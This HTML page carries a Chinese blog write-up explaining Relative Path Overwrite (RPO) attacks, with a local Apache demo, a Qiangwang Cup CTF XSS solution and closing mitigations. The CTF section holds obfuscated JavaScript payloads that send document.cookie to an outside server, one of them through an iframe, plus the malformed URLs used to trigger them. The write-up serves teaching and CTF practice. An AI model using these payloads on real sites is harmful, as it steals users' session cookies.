<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>RPO攻击解析 | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">RPO攻击解析</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">三月 27, 2018&nbsp;&nbsp;23:55:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/安全之旅/">安全之旅</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="/2018/03/27/RPO攻击解析/userid363214time20141028063048at22.jpg" alt=""></p>
<blockquote>
<p>一种新的XSS攻击手法<br>
以强网杯中的一道Web题为例做解析</p>
</blockquote>
<a id="more"></a>
<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1>
<p>RPO(Relative Path Overwrite)攻击，原理一句话概括就是利用服务器和客户端浏览器对当前网址不同的解析导致的。</p>
<h1 id="本地演示"><a class="markdownIt-Anchor" href="#本地演示"></a> 本地演示</h1>
<p>我们搭建本地环境来演示一下这个攻击，来一个比较直观的感官认识<br>
首先我们的目录结构是这样的<br>
pro<br>
│  1.php<br>
│  common.js<br>
├─ bbb<br>
│             common.js<br>
在/pro目录下的common.js中是弹一个<code>common function</code>的窗</p>
<p><img src="/2018/03/27/RPO攻击解析/10-11-22.jpg" alt=""><br>
而/pro/bbb目录下的common.js中是弹一个<code>Evil function</code>的窗，代表这是一个我们可控的界面，然后写了个恶意的js脚本<br>
<img src="/2018/03/27/RPO攻击解析/10-11-58.jpg" alt=""><br>
然后我们在1.php中引用了…/…/common.js</p>
<p><img src="/2018/03/27/RPO攻击解析/10-18-51.jpg" alt=""><br>
需要注意的是，我们在.htaccess中rewrite了1.php地址<br>
当我们访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/1.php/test/1234</span><br></pre></td></tr></table></figure>
<p>就相当于访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/1.php?user=test&amp;id=1234</span><br></pre></td></tr></table></figure>
<p><img src="/2018/03/27/RPO攻击解析/10-19-11.jpg" alt=""><br>
这个在.htaccess里面很好实现，就是简化了传参方式，作用就是直观和简洁<br>
访问在这个网址就会调用<code>../../common.js</code><br>
即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/1.php/test/1234/../../common.js =&gt; http://localhost/pro/tecommon.js</span><br></pre></td></tr></table></figure>
<p>弹出了<code>common function</code>框<br>
<img src="/2018/03/27/RPO攻击解析/10-21-00.jpg" alt=""></p>
<p>一切看起来很正常，但是当我们输入这样的地址时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/1.php/test%2f1234</span><br></pre></td></tr></table></figure>
<p><img src="/2018/03/27/RPO攻击解析/10-23-00.jpg" alt=""><br>
php解释器依旧正常解析，然而客户端的浏览器就出现问题了，它现在调用<code>../../common.js</code>却是在请求<code>http://localhost/common.js</code><br>
<img src="/2018/03/27/RPO攻击解析/10-25-20.jpg" alt=""><br>
很容易我们可以意识到一个问题，服务器和浏览器对网址的解析出现了差异<br>
服务器对地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/1.php/test%2f1234</span><br></pre></td></tr></table></figure>
<p>能解码成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/1.php/test/1234</span><br></pre></td></tr></table></figure>
<p>然后正常访问，但是在客户端的浏览器却无法识别<code>%2f</code>而是把<code>test%2f1234</code>当成了一个层次目录里面的文件而不是<code>test/1234</code>这样的跨层次目录结构<br>
所以浏览器会将<br>
<code>http://localhost/</code><s>pro/1.php/test%2f1234/…/…</s><code>/common.js</code><br>
解释成<code>http://localhost/common.js</code><br>
总的来说，浏览器并不能识别<code>%2f</code>，并不把它当成分割目录的符号而是把它当成一个普通的没有任何特殊意义的字符，但是服务器却能识别<br>
所以我们尝试输入这样的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pro/bbb/..%2f1.php/test/123</span><br></pre></td></tr></table></figure>
<p>即<code>http://localhost/pro/</code><s>bbb/…%2f</s><code>1.php/test/123</code><br>
=&gt;<br>
<code>http://localhost/pro/1.php/test/123</code></p>
<p><img src="/2018/03/27/RPO攻击解析/10-33-02.jpg" alt=""><br>
服务器正常访问而对于浏览器来说，引用<code>../../common.js</code>却是这样的<br>
<code>http://localhost/pro/bbb/</code><s>…%2f1.php/test/123/…/…/</s><code>common.js</code><br>
然后就访问了<code>http://localhost/pro/bbb/common.js</code>，然后执行了里面的JS代码</p>
<p><img src="/2018/03/27/RPO攻击解析/10-37-01.jpg" alt=""><br>
对于.CSS等静态文件也是一样的原理(css里面用expression也可以执行一些敏感操作)<br>
对此我们可以执行任意可控的静态页面(反过来我们也可以将动态页面当静态页面获取源码)</p>
<h2 id="apache配置"><a class="markdownIt-Anchor" href="#apache配置"></a> Apache配置</h2>
<p>1.打开Apache 的 mod_rewrite模块</p>
<p><img src="/2018/03/27/RPO攻击解析/10-42-54.jpg" alt=""></p>
<p>在httpd.conf中去掉注释LoadModule rewrite_module modules/mod_rewrite.so的<code>#</code>即可<br>
2.在httpd.conf中网站目录下的<directory>把AllowOverride none改为AllowOverride All<br>
<img src="/2018/03/27/RPO攻击解析/10-45-24.jpg" alt=""><br>
3.在httpd.conf末尾加上AllowEncodedSlashes On这句，表示允许在地址中<code>%2f</code> <code>/</code> <code>\</code>等斜杠<br>
4.在网站根目录下创建.htaccess文件,内容如下:</directory></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ifmodule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">RewriteEngine  On   /*开启重写引擎*/</span><br><span class="line">RewriteCond  匹配条件</span><br><span class="line">RewriteRule 匹配规则</span><br><span class="line"><span class="tag">&lt;/<span class="name">ifmodule</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="以ctf题为例"><a class="markdownIt-Anchor" href="#以ctf题为例"></a> 以CTF题为例</h1>
<p>我们现在以强网杯中的一道XSS题为例，演示RPO攻击<br>
首先进去是一个登陆的界面<br>
<img src="/2018/03/27/RPO攻击解析/00-19-02.jpg" alt=""></p>
<p>随便注册个账号进去，发现了一个留言板和一个提交网址的界面</p>
<p><img src="/2018/03/27/RPO攻击解析/00-20-10.jpg" alt=""><br>
<img src="/2018/03/27/RPO攻击解析/00-20-16.jpg" alt=""><br>
玩过XSS的同学都知道这个验证码预示着啥<br>
于是我将大量时间研究这里，直到出现了第二个Hint<br>
<img src="/2018/03/27/RPO攻击解析/10-51-12.jpg" alt=""></p>
<p>确实有点气<br>
分析一下<br>
<code>index.php</code>部分明显用了重写如地址<code>http://39.107.33.96:20000/index.php/view/article/1729</code>应该等于<code>http://39.107.33.96:20000/index.php?mod=view&amp;type=article&amp;id=1729</code></p>
<ul>
<li>在write article的地方应该使用了<code>htmlspecialchars()</code>函数转义了<code>&lt;&gt;</code>、<code>'</code>、<code>&quot;</code>等符号</li>
<li>在report界面我们可以提交本地的url给管理员点击访问</li>
<li>index.php用相对路径引用了 <code>static/js/jquery.min.js</code>和<code>static/js/index.js</code><br>
我们尝试一下随便写个<code>12345</code>进article<br>
然后访问地址<code>http://39.107.33.96:20000/index.php/view/article/1729</code></li>
</ul>
<p><img src="/2018/03/27/RPO攻击解析/11-15-07.jpg" alt=""><br>
当我们在这个地址后面随便加点东西时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1729/12rfv1g/sfw2ghvneov/cfv32jvnniob</span><br></pre></td></tr></table></figure>
<p><img src="/2018/03/27/RPO攻击解析/11-17-41.jpg" alt=""><br>
仍然解析正确<br>
我们可以理解为后面乱输入的几个参数并没有对应代码处理，也就被忽略了，前面几个参数则正确处理，显示了正确的文章<br>
如访问一个网站<code>http://www.wzsite.cn?name=test&amp;age=666</code>，然而站点里面并没有<code>name</code>和<code>age</code>对应参数处理，但是服务依旧会正常执行<br>
是不是很熟悉？<br>
对的，就是RPO攻击<br>
我们基本确定思路为：</p>
<ol>
<li>在article里面构造js代码，单、双引号可以用函数String.fromCharCode()以及反引号加上<code>\u0022</code>等unicode绕过</li>
<li>然后利用RPO攻击计较畸形的url给他点击，然后将article里面的静态文本当成js代码执行</li>
</ol>
<p>我们首先构造这样的一个payload，绕过对尖括号和单双引号的转义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="built_in">String</span>.fromCharCode(<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">119</span>, <span class="number">122</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">61</span>)+btoa(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>
<p>大意就是new一个image，然后设置src=<code>http://my_VPS:port?coo=</code>+bbtoa(document.cookie),btoa()是base64编码</p>
<p><img src="/2018/03/27/RPO攻击解析/11-04-37.jpg" alt=""><br>
将在article里面写入payload，得到如下<br>
<code>http://39.107.33.96:20000/index.php/view/article/1546</code><br>
<img src="/2018/03/27/RPO攻击解析/11-22-53.jpg" alt=""><br>
然后我们在VPS打开2501端口侦听(当然你也可以放到xss平台)<br>
随后我们测试一下，访问地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1546/..%2f..%2f..%2f..%2findex.php</span><br></pre></td></tr></table></figure>
<p>发现我们的vps的2501端口接受到了请求：</p>
<p><img src="/2018/03/27/RPO攻击解析/11-25-55.jpg" alt=""><br>
这是因为当我们访问地址<code>http://39.107.33.96:20000/index.php/view/article/1546/..%2f..%2f..%2f..%2findex.php</code> 对于服务器来说我们访问的是<br>
<code>http://39.107.33.96:20000/</code><s>index.php/view/article/1546/…%2f…%2f…%2f…%2f</s><code>index.php</code><br>
然后我们客户端的浏览器却认为~~/…%2f…%2f…%2f…%2f~~是同一层目录的，所以在调用<code>/static/js/jquery.min.js</code>的时候其实会去请求地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1546/static/js/jquery.min.js</span><br></pre></td></tr></table></figure>
<p>而对于重写的url来说只是传多了<code>static</code>、<code>js</code>、<code>jquery.min.js</code>几个参数，依然返回的是这个地址的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/1546</span><br></pre></td></tr></table></figure>
<p>然后浏览器会将返回的内容当JS代码进行解析执行，向我的服务器2501端口发送带cookie的请求<br>
所以现在我们将这个畸形的地址发给admin访问就能获取到cookie了<br>
此外那个验证码自己用python写个脚本碰撞一下就好了，我的做法是事先生成一个一一对应的类似于字典的东西，然后每次只需要读文件而不需要重新计算，会快很多，拿空间换时间嘛<br>
提交之后我们的vps就会收到请求了</p>
<p><img src="/2018/03/27/RPO攻击解析/14-53-25.jpg" alt=""></p>
<p>所以我们base64解码一下传回来的<code>coo</code></p>
<p><img src="/2018/03/27/RPO攻击解析/14-56-27.jpg" alt=""></p>
<p>就会发现一个<code>hint</code>，叫我们去读取<code>/QWB_fl4g/QWB/</code>下的cookie<br>
那么我们需要用iframe进行同域cookie读取，payload如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="built_in">String</span>.fromCharCode(<span class="number">105</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>));<span class="comment">//create一个iframe</span></span><br><span class="line">iframe.name=<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">111</span>);<span class="comment">//命名为Testzero</span></span><br><span class="line">iframe.src=<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">57</span>, <span class="number">54</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">81</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">52</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">81</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">47</span>);<span class="comment">//设置iframe的src为http://39.107.33.96:20000/QWB_fl4g/QWB/</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);<span class="comment">//append iframe</span></span><br><span class="line"><span class="comment">//当iframe加载好之后将执行一个函数，函数的作用是将当前网址转向http://my_vps:2501?coo=iframe的cookie</span></span><br><span class="line">iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;location.href=<span class="built_in">String</span>.fromCharCode(<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">119</span>, <span class="number">122</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">61</span>)+btoa(Testzero.window.document.cookie);&#125;</span><br></pre></td></tr></table></figure>
<p>然后一样写进article，然后再将对应的畸形url report给admin，就可以收到flag了<br>
唯一需要注意的是写js的payload的时候需要等iframe加载完毕之后再跳转，不然带不出flag<br>
<img src="/2018/03/27/RPO攻击解析/15-04-26.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ZmxhZz1RV0IlN0JmbGFnX2lzX2Y0M2t0aDRycG8lN0Q7IJTlQ9VHJ5IHRvIGdldCB0aGUgY29va2llIG9mIHBhdGggIi9RV0JfZmw0Zy9RV0IvIg== | base64 -d</span><br><span class="line">flag=QWB%7Bflag_is_f43kth4rpo%7D; HINT=Try to get the cookie of path <span class="string">"/QWB_fl4g/QWB/"</span></span><br></pre></td></tr></table></figure>
<p>获得flag<br>
<code>QWB{flag_is_f43kth4rpo}</code></p>
<h3 id="rpo-解决方案"><a class="markdownIt-Anchor" href="#rpo-解决方案"></a> RPO 解决方案</h3>
<ul>
<li>不用相对路径，用绝对路径</li>
<li>不允许%2f等存在在url里面，如关闭AllowEncodedSlashes（Ngnix也存在该问题）</li>
</ul>
<h3 id="最后说一句"><a class="markdownIt-Anchor" href="#最后说一句"></a> 最后说一句</h3>
<p>这位文章的师傅说的很对<a href="http://www.qingpingshan.com/pc/aq/240597.html" target="_blank" rel="noopener">Pwnhub大物必须过Writeup</a><br>
一遍打比赛一遍学姿势，给做题人方向上的引导，引发思考，这才是一道<strong>好题</strong>所需要做的<br>
想想之前一些盗题的、脑洞的、考毫无意义的知识的比赛，这个题真的让人如浴春风</p>
<p><strong>感谢阅读</strong></p>
<h3 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接：</h3>
<p><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">RPO攻击技术浅析 - http://blog.nsfocus.net/rpo-attack/</a><br>
<a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">深入剖析RPO漏洞 - https://xz.aliyun.com/t/2220</a><br>
<a href="http://www.qingpingshan.com/pc/aq/240597.html" target="_blank" rel="noopener">Pwnhub大物必须过Writeup - http://www.qingpingshan.com/pc/aq/240597.html</a><br>
<a href="http://www.ideawu.net/blog/archives/494.html" target="_blank" rel="noopener">链接包含”%2F”导致mod_rewrite失效 - http://www.ideawu.net/blog/archives/494.html</a><br>
<a href="http://www.ideawu.net/blog/archives/618.html" target="_blank" rel="noopener">Apache用mod_rewrite配置子域名 - http://www.ideawu.net/blog/archives/618.html</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>T3stzer0</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.testzero-wz.com/2018/03/27/RPO攻击解析/">https://www.testzero-wz.com/2018/03/27/RPO攻击解析/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/CTF/"># CTF</a>
                    
                        <a href="/tag/总结/"># 总结</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2018/04/06/写一个ARP欺骗的命令行工具/">写一个ARP欺骗的命令行工具</a>
            
            
            <a class="next" rel="next" href="/2018/03/26/第二届强网杯-QWB-部分Writeup/">第二届强网杯-QWB-部分Writeup</a>
            
        </section>


    </article>
</div>

        </div>
        <!-- 
<footer id="footer" class="footer">
    <div class="copyright">
        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

-->
    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>
